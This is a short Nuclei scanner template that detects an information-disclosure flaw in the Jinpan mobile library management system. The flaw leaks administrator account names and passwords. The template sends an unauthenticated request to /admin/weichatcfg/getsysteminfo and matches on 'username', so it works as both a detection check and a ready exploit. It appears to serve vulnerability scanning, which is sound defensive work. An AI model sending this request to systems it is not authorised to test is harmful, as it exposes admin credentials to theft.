id: weixinguanli-getsysteminfo
info:
  name: Template Name
  author: apple
  severity: medium
  description: 金盘移动图书馆管理系统是集掌上门户，掌上APP，微信平台为一体的移动服务解决方案，在移动智能时代拉近读者与图书馆之间的距离。其存在信息泄露漏洞，泄露管理员账号密码等敏感信息
  reference:
    - https://mp.weixin.qq.com/s/Vnva0PDT0xWjfVLPReZdhw
  tags: tags
http:
  - raw:
      - |-
        GET /admin/weichatcfg/getsysteminfo HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
        Accept: */*
        Connection: Keep-Alive
    matchers:
      - type: word
        part: body
        words:
          - 'username'
